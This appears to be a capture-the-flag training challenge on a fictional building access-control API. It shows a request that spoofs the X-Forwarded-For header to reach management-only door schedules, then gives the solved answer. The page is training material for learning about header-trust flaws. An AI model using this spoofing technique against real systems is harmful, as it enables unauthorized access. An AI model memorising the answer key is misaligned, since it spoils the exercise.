
# Daily Hack #110
**First blood**

**M2F14M3**

**Solved by**
- sfmt
- Cyberelements
- Sidra
- rpaul1730
- JoeS
- fedvillalba

**The header that says where you are**

**Privilege Escalation & Post-Exploitation**

**Difficulty:** Medium
**~4 min**
**+10 XP**

---

## Mission briefing

Thornbury manages the access control for a few dozen buildings, and the door schedules are read-only to anyone outside the management network. That restriction is real: the API refuses you from the internet and says so. It is also enforced by asking the caller where the caller is. Get the Leeds site schedule, read the overrides at the bottom of it, and name the door that a facilities ticket has left open to anyone who walks up to it for the next two months.

---

## Investigate

Repeater on the Thornbury schedule API, with the request as it leaves your machine. The `X-Forwarded-For` header is prefilled with your own address. Edit it and send again.

### REQUEST

```http
GET /api/v2/sites/leeds-kirkstall/schedule HTTP/1.1
Host: access.thornbury.example
Authorization: Bearer tb_rd_9f41c0b7e2
X-Forwarded-For: 10.12.0.9
Accept: application/json

```
**Reset | Send**

### RESPONSE

```http
HTTP/1.1 200 OK
Content-Type: application/json
X-Resolved-Client: 10.12.0.9 (management vlan)

```

```json
{
  "site": "leeds-kirkstall",
  "generated": "2026-10-06T08:02:11Z",
  "doors": [
    {
      "id": "lobby",
      "mon_fri": "07:30-19:00",
      "sat": "09:00-13:00",
      "sun": "locked",
      "mode": "card+pin"
    },
    {
      "id": "goods-in",
      "mon_fri": "06:00-18:00",
      "sat": "locked",
      "sun": "locked",
      "mode": "card"
    },
    {
      "id": "loading-bay-1",
      "mon_fri": "06:00-18:00",
      "sat": "locked",
      "sun": "locked",
      "mode": "card"
    },
    {
      "id": "loading-bay-2",
      "mon_fri": "06:00-18:00",
      "sat": "locked",
      "sun": "locked",
      "mode": "card"
    },
    {
      "id": "plant-room",
      "mon_fri": "locked",
      "sat": "locked",
      "sun": "locked",
      "mode": "card+pin"
    },
    {
      "id": "roof-access",
      "mon_fri": "locked",
      "sat": "locked",
      "sun": "locked",
      "mode": "card+pin"
    }
  ],
  "overrides": [
    {
      "ref": "OVR-2288",
      "door": "goods-in",
      "from": "2026-10-05",
      "to": "2026-10-06",
      "mode": "card",
      "raised_by": "facilities",
      "note": "delivery window extended"
    },
    {
      "ref": "OVR-2291",
      "door": "loading-bay-2",
      "from": "2026-10-03",
      "to": "2026-11-30",
      "mode": "unlocked",
      "raised_by": "facilities",
      "note": "contractor access, no card required"
    },
    {
      "ref": "OVR-2294",
      "door": "plant-room",
      "from": "2026-10-06",
      "to": "2026-10-06",
      "mode": "card+pin",
      "raised_by": "facilities",
      "note": "annual boiler inspection"
    }
  ]
}

```
### Answer
Door left unlocked by the override:

`loading-bay-2`

